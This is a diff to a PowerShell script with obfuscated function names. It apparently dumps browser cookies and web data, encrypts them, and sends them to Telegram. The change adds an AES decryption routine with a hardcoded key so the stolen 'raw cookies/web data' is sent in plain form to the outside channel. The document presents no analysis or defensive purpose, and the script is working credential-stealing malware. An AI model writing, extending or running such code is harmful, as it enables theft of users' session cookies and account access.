@@ -88,7 +88,43 @@ Function Yy {
     }
 }
 
+Function DecryptMessage {
+    param (
+        [string]$base64Message,
+        [string]$K1 = "MySuperSecretKey123456"
+    )
+
+    # Convert base64 message to bytes
+    $encryptedData = [Convert]::FromBase64String($base64Message)
+
+    # Extract the IV (first 16 bytes) and the ciphertext (rest of the bytes)
+    $IV = $encryptedData[0..15] # First 16 bytes are the IV
+    $cipherText = $encryptedData[16..($encryptedData.Length - 1)] # Rest is the actual encrypted data
+
+    # Create AES object and set properties
+    $aes = New-Object System.Security.Cryptography.AesManaged
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($K1.PadRight(32, '0'))  # Ensure the key is 32 bytes
+    $aes.IV = $IV
+
+    # Create the decryptor
+    $decryptor = $aes.CreateDecryptor()
+
+    # Decrypt the data
+    $plainTextBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)
+    
+    # Convert bytes back to string
+    $plainText = [System.Text.Encoding]::UTF8.GetString($plainTextBytes)
+    return $plainText
+}
+
 # Entry Point
 $DUMP = Xx
 $ENC = Zz -D1 $DUMP
-Yy -Msg ("Result:`n`n" + $ENC)
+
+# Decrypt the base64 encoded encrypted data to get raw cookies/web data
+$DECRYPTED = DecryptMessage -base64Message $ENC
+
+# Send the decrypted data to Telegram
+Yy -Msg ("Raw Data:`n`n" + $DECRYPTED)
